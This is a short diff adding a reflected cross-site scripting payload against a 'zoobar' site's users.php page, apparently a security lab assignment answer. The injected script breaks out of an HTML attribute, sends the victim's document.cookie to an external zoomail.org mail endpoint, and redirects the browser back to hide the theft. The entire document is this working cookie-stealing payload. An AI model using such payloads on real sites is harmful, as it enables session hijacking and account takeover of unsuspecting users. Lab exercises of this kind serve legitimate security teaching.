@@ -1,0 +1,5 @@
+http://zoobar.org/users.php?user=
+" size=10><script>
+var x = new Image().src='http://zoomail.org/sendmail.php?' + '&netid=jdmack' + '&payload=' + document.cookie + '&random=' + Math.random();
+window.location.assign("http://zoobar.org/users.php");
+</script>
